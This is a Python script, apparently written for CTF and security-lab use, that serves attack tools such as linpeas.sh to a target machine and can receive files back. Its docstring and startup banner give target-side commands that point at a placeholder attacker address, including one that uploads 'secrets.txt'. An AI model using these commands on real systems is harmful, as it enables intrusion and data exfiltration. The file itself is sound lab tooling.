#!/usr/bin/env python3
"""
dropper.py - a tiny web server for moving files during a CTF or security lab.

THE IDEA
    You run this on YOUR machine. It shares a folder over the web. The machine
    you are attacking (the "target") downloads your tools from it with wget or
    curl - and, if you turn on uploads, sends files back to you.
    Nothing to install: just Python 3. No browser, no setup.

QUICK START
    1. Put your tools in a folder, e.g.  ~/ctf/tools
    2. Run:  python3 dropper.py --dir ~/ctf/tools
    3. It prints your VPN IP and the exact commands to run on the target.

ON THE TARGET  (copy-paste what the program prints, with the real IP)
    wget http://YOUR-IP:8000/linpeas.sh       # download a tool
    curl -O http://YOUR-IP:8000/linpeas.sh    # same, using curl

    You only need the file NAME - it looks inside sub-folders for you.
    If two files share a name, give the full path instead:
        curl -O http://YOUR-IP:8000/dl/windows/nc.exe

SEE WHAT IS BEING SHARED
    curl http://YOUR-IP:8000/             # list the top folder
    curl http://YOUR-IP:8000/?path=win    # list a sub-folder

SEND A FILE BACK TO YOURSELF  (only works if you started it with --upload)
    curl -T secrets.txt http://YOUR-IP:8000/up/

NOTE
    There is no password: anyone who can reach your VPN IP can download from
    you. That is fine for public tools. Uploads are limited (size cap, saved to
    a separate folder, optional IP allow-list) so nobody can abuse them.
"""

import os
import sys
import argparse
import pathlib
import subprocess
from datetime import datetime
from urllib.parse import urlsplit, unquote, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HARD_CAP = 50 * 1024**2   # 50MB ceiling; --max-upload can only lower it


# --------------------------------------------------------------------------
# CLI / config
# --------------------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--dir", default=".",
                   help="folder on your machine to share (default: current folder)")
    p.add_argument("--host", default=None,
                   help="your IP to listen on (default: auto-detect the VPN IP)")
    p.add_argument("--port", type=int, default=8000,
                   help="port number to listen on (default: 8000)")
    p.add_argument("--iface", default="tun0",
                   help="name of your VPN network interface (default: tun0)")
    p.add_argument("--upload", action="store_true",
                   help="also let the target send files back to you")
    p.add_argument("--upload-dir", default=None,
                   help="folder to save files sent back to you "
                        "(default: a 'dropper-loot' folder next to the shared folder)")
    p.add_argument("--max-upload", default="50M",
                   help="biggest file the target may send back, up to 50M (default: 50M)")
    p.add_argument("--upload-from", default=None,
                   help="only let these IPs send files back, comma-separated (default: anyone)")
    return p.parse_args()


def parse_size(s):
    s = s.strip().upper()
    mult = 1
    if s and s[-1] in "BKMGT":
        mult = {"B": 1, "K": 1024, "M": 1024**2, "G": 1024**3, "T": 1024**4}[s[-1]]
        s = s[:-1]
    try:
        val = int(float(s) * mult)
    except (ValueError, OverflowError):
        sys.exit(f"ERROR: bad --max-upload value: {s!r}")
    if val <= 0:
        sys.exit("ERROR: --max-upload must be a positive size")
    return val


def iface_ip(iface):
    """IPv4 of a network interface via `ip addr`, or None."""
    try:
        out = subprocess.run(
            ["ip", "-4", "-br", "addr", "show", iface],
            capture_output=True, text=True, timeout=3).stdout
    except Exception:
        return None
    for tok in out.split():
        if tok.count(".") == 3 and "/" in tok:
            return tok.split("/")[0]
    return None


def setup():
    """Read args and set runtime config. Called from main(), not at import,
    so importing this module has no side effects (no argv read, no mkdir)."""
    global args, ROOT, VPN_IP, BIND, SHOWN, MAX_UPLOAD, UPLOAD_DIR, UPLOAD_FROM
    args = parse_args()

    ROOT = pathlib.Path(args.dir).resolve()
    ROOT.mkdir(parents=True, exist_ok=True)

    VPN_IP = iface_ip(args.iface)
    BIND = args.host or VPN_IP or "0.0.0.0"
    # address shown in the paste-ready commands (never 0.0.0.0)
    SHOWN = args.host if (args.host and args.host != "0.0.0.0") else (VPN_IP or "127.0.0.1")

    MAX_UPLOAD = min(parse_size(args.max_upload), HARD_CAP)
    if args.upload_dir:
        UPLOAD_DIR = pathlib.Path(args.upload_dir).resolve()
    else:   # sibling of the served dir, so loot is never inside what you serve
        UPLOAD_DIR = ROOT.parent / "dropper-loot"
    UPLOAD_FROM = ({x.strip() for x in args.upload_from.split(",") if x.strip()}
                   if args.upload_from else None)
    if args.upload:
        UPLOAD_DIR.mkdir(parents=True, exist_ok=True)


# --------------------------------------------------------------------------
# Colors (Catppuccin Mocha). Auto-off when piped; FORCE_COLOR / NO_COLOR honored.
# --------------------------------------------------------------------------
COLOR = (
    (bool(os.environ.get("FORCE_COLOR")) or sys.stdout.isatty())
    and os.environ.get("NO_COLOR") is None
    and os.environ.get("TERM") != "dumb"
)

GREEN, BLUE = "a6e3a1", "89b4fa"
YELLOW, TEXT, DIM = "f9e2af", "cdd6f4", "6c7086"
TEAL, LIME = "94e2d5", "9fef00"


def paint(text, hexstr=None, bold=False):
    if not COLOR:
        return text
    pre = "\033[1m" if bold else ""
    if hexstr:
        r, g, b = int(hexstr[0:2], 16), int(hexstr[2:4], 16), int(hexstr[4:6], 16)
        pre += f"\033[38;2;{r};{g};{b}m"
    return f"{pre}{text}\033[0m"


# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------
def human(n):
    for unit in ("B", "K", "M", "G", "T"):
        if n < 1024:
            return f"{n:.0f}{unit}" if unit == "B" else f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}P"


def safe(rel):
    """Resolve rel under ROOT; None if it escapes (blocks ../ and symlinks)."""
    target = (ROOT / rel).resolve()
    if target != ROOT and ROOT not in target.parents:
        return None
    return target


def find_one(name):
    """First file in the tree matching a bare name (walked live). Skips any
    match that resolves outside ROOT, so a symlink can't be used to escape."""
    for base, _, files in os.walk(ROOT):
        if name in files:
            cand = pathlib.Path(base, name)
            real = cand.resolve()
            if real == ROOT or ROOT in real.parents:
                return cand
    return None


def clean_name(raw):
    """Strip any path and control chars from an uploaded filename."""
    name = pathlib.Path(raw).name
    name = "".join(ch for ch in name if ch >= " " and ch != "\x7f").strip()
    if name in ("", ".", ".."):
        return None
    return name[:255]


def open_unique(folder, name):
    """Atomically create a new file in folder, never overwriting (adds _1, _2...).
    Returns (path, open binary file). Atomic, so concurrent uploads can't clash."""
    base = folder / name
    stem, suf, i = base.stem, base.suffix, 0
    while True:
        cand = base if i == 0 else folder / f"{stem}_{i}{suf}"
        try:
            fd = os.open(cand, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o644)
            return cand, os.fdopen(fd, "wb")
        except FileExistsError:
            i += 1


def inventory(root):
    """Colored tree of what's served: (lines, file_count, duplicate_names)."""
    lines, count, seen, dups = [], 0, set(), set()

    def walk(d, prefix):
        nonlocal count
        try:
            entries = sorted(d.iterdir(), key=lambda c: (c.is_file(), c.name.lower()))
        except OSError:
            return
        for i, c in enumerate(entries):
            last = i == len(entries) - 1
            guide = paint(prefix + ("└── " if last else "├── "), DIM)
            if c.is_dir():
                lines.append(guide + paint(c.name + "/", BLUE, bold=True))
                walk(c, prefix + ("    " if last else "│   "))
            elif c.is_file():
                count += 1
                if c.name in seen:
                    dups.add(c.name)
                seen.add(c.name)
                try:
                    size = human(c.stat().st_size)
                except OSError:
                    size = "?"
                lines.append(guide + paint(c.name, TEXT) + paint(f"  {size}", DIM))

    walk(root, "")
    return lines, count, sorted(dups)


# --------------------------------------------------------------------------
# Request handler
# --------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    server_version = "dropper"
    timeout = 20                # drop idle / stalled connections after 20s

    # compact one-line log; control chars stripped so a crafted request path
    # can't inject terminal escape sequences into your console.
    def log_message(self, fmt, *a):
        line = fmt % a
        line = "".join(ch if " " <= ch != "\x7f" else "." for ch in line)
        sys.stderr.write(f"{self.address_string():<15} {line}\n")

    @staticmethod
    def _rm(path):
        try:
            path.unlink()
        except OSError:
            pass

    def _text(self, code, body):
        data = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(data)

    def _send_file(self, path):
        try:
            size = path.stat().st_size
            f = open(path, "rb")
        except OSError:
            return self._text(404, "not found\n")
        disp = "".join(ch for ch in path.name if ch >= " " and ch not in '"\\')
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(size))
        self.send_header("Content-Disposition", f'attachment; filename="{disp}"')
        self.end_headers()
        with f:
            if self.command == "HEAD":
                return
            while chunk := f.read(64 * 1024):
                self.wfile.write(chunk)

    def _listing(self, qs):
        rel = (parse_qs(qs).get("path", [""])[0]).strip("/")
        d = safe(rel)
        if not d or not d.is_dir():
            return self._text(404, "not found\n")
        rows = []
        for c in sorted(d.iterdir(), key=lambda c: (c.is_file(), c.name.lower())):
            try:
                st = c.stat()
            except OSError:
                continue
            when = datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M")
            name = c.name + ("/" if c.is_dir() else "")
            size = "-" if c.is_dir() else human(st.st_size)
            rows.append(f"{when}  {size:>8}  {name}")
        shown = "/" + rel if rel else "/"   # relative, not your local absolute path
        return self._text(200, f"# {shown}\n" + ("\n".join(rows) or "(empty)") + "\n")

    def do_GET(self):
        split = urlsplit(self.path)
        path = unquote(split.path)
        if path == "/_ping":
            return self._text(200, "ok\n")
        if path == "/":
            return self._listing(split.query)
        if path.startswith("/dl/"):
            t = safe(path[4:])
            return self._send_file(t) if t and t.is_file() else self._text(404, "not found\n")
        # bare name: /linpeas.sh  (single segment only)
        name = path.lstrip("/")
        if name and "/" not in name:
            hit = find_one(name)
            return self._send_file(hit) if hit else self._text(404, "not found\n")
        return self._text(404, "not found\n")

    do_HEAD = do_GET

    def _upload(self):
        if not args.upload:
            return self._text(403, "uploads disabled (run with --upload)\n")
        if UPLOAD_FROM is not None and self.client_address[0] not in UPLOAD_FROM:
            return self._text(403, "uploads not allowed from your IP\n")
        name = clean_name(pathlib.Path(unquote(urlsplit(self.path).path)).name)
        if not name:
            return self._text(400, "give a valid filename: /up/<name>\n")
        try:
            length = int(self.headers.get("Content-Length", 0))
        except ValueError:
            length = 0
        if length <= 0:
            return self._text(400, "empty body\n")
        if length > MAX_UPLOAD:
            return self._text(413, f"too large (max {human(MAX_UPLOAD)})\n")

        dest, f = open_unique(UPLOAD_DIR, name)   # isolated dir, atomic, no overwrite
        written, over = 0, False
        try:
            with f:
                remaining = length
                while remaining > 0:
                    chunk = self.rfile.read(min(64 * 1024, remaining))
                    if not chunk:
                        break
                    written += len(chunk)
                    if written > MAX_UPLOAD:        # client lied about Content-Length
                        over = True
                        break
                    f.write(chunk)
                    remaining -= len(chunk)
        except OSError:
            self._rm(dest)
            return self._text(500, "write failed\n")
        if over:
            self._rm(dest)
            return self._text(413, f"too large (max {human(MAX_UPLOAD)})\n")
        if written != length:                       # connection cut mid-transfer
            self._rm(dest)
            return self._text(400, "incomplete upload (got "
                              f"{human(written)} of {human(length)})\n")
        return self._text(201, f"stored {dest.name} ({human(written)})\n")

    do_POST = _upload
    do_PUT = _upload


# --------------------------------------------------------------------------
# Banner
# --------------------------------------------------------------------------
def banner():
    lines, count, dups = inventory(ROOT)
    rule = "  " + paint("─" * 46, DIM)
    url = f"http://{SHOWN}:{args.port}"

    def row(label, value):
        return f"  {paint(label.ljust(9), DIM)}{value}"

    up_val = paint("on", GREEN, bold=True) if args.upload else paint("off", DIM)
    fcount = paint(f"{count} file{'' if count == 1 else 's'}", DIM)
    bind_note = "" if (VPN_IP or args.host) else paint(f"  (no {args.iface})", YELLOW)

    print()
    print(f"  {paint('dropper', LIME, bold=True)}  {paint('· file dropper', DIM)}")
    print(rule)
    print(row("serving", f"{paint(str(ROOT), TEXT)}  {fcount}"))
    print(row("listen", paint(url, TEAL, bold=True) + bind_note))
    print(row("uploads", up_val))
    if args.upload:
        det = paint(f"↳ {UPLOAD_DIR}", TEXT) + paint(f"  max {human(MAX_UPLOAD)}", DIM)
        if UPLOAD_FROM:
            det += paint("  from " + ",".join(sorted(UPLOAD_FROM)), GREEN, bold=True)
        else:
            det += paint("  from any IP", YELLOW)
        print(row("", det))
        if UPLOAD_DIR == ROOT or ROOT in UPLOAD_DIR.parents:
            print("  " + paint("! ", YELLOW, bold=True)
                  + paint("upload dir is inside the served dir — uploads are downloadable",
                          YELLOW))
    print(rule)

    print(f"  {paint('hosting', BLUE, bold=True)}")
    if lines:
        LIMIT = 200
        for ln in lines[:LIMIT]:
            print("  " + ln)
        if len(lines) > LIMIT:
            print("  " + paint(f"... (+{len(lines) - LIMIT} more)", DIM))
    else:
        print("  " + paint("nothing yet — drop files into the served dir", DIM))

    if dups:
        print("  " + paint("! ", YELLOW, bold=True)
              + paint(f"repeated: {', '.join(dups)}", YELLOW)
              + paint("  (use /dl/<path> for a specific one)", DIM))

    print()
    print(f"  {paint('on target', GREEN, bold=True)}")
    print("    " + paint("wget ", DIM) + paint(url + "/", TEAL) + paint("FILENAME", YELLOW))
    print("    " + paint("curl -O ", DIM) + paint(url + "/", TEAL) + paint("FILENAME", YELLOW))
    if args.upload:
        print("    " + paint("curl -T loot ", DIM) + paint(url + "/up/", TEAL))
    print()
    print("  " + paint("Ctrl-C to stop", DIM))
    print()
    sys.stdout.flush()


# --------------------------------------------------------------------------
# Run
# --------------------------------------------------------------------------
def main():
    try:  # box-drawing chars need UTF-8; some consoles default to legacy encodings
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
    setup()
    try:
        httpd = ThreadingHTTPServer((BIND, args.port), Handler)
    except OSError as e:
        sys.exit(f"ERROR: cannot bind {BIND}:{args.port} - {e}")
    httpd.daemon_threads = True
    banner()
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nstopped")


if __name__ == "__main__":
    main()
